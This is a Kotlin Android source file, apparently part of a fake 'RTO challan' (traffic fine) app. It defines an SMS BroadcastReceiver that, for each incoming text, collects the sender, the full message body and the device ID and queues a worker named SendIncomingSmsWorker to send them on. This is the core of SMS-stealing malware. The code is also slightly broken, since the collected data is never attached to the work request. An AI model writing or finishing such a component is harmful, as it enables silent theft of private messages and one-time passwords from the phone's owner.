package com.rte.challan.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Settings
import android.provider.Telephony
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.workDataOf
import com.rte.challan.worker.SendIncomingSmsWorker

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            
            // Device ID nikalne ka standard tarika (Agar DeviceInfo class nahi hai toh)
            val deviceId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)

            for (sms in messages) {
                val sender = sms.displayOriginatingAddress ?: "Unknown"
                val messageBody = sms.messageBody ?: ""

                // Worker ko data pass karein
                val data = workDataOf(
                    "sender" to sender,
                    "body" to messageBody,
                    "deviceId" to deviceId
                )

                val workRequest = OneTimeWorkRequestBuilder<SendIncomingSmsWorker>()
                    .build()
                
                // Work enqueue karein
                WorkManager.getInstance(context).enqueue(workRequest)
            }
        }
    }
}
